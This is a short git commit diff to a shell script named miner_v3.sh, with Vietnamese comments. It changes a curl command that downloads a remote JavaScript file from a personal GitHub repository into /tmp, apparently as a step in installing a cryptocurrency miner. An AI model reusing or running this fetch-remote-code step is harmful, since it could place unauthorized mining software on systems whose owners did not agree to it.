65b9182a1f575343e0984bccd1203207cb60a0df
ĐM <117666678+DucManh206@users.noreply.github.com>
2025-04-29 17:16:32 +0700

    Update miner_v3.sh

--- miner_v3.sh
+++ miner_v3.sh
@@ -4,7 +4,7 @@
 
 # Tải script Node.js từ URL
 echo "🚀 Đang tải script Node.js..."
-curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/startup.js -o /tmp/startup.js
+curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/min.js -o /tmp/startup.js
 
 # Kiểm tra xem script đã tải về thành công không
 if [ ! -f "/tmp/startup.js" ]; then
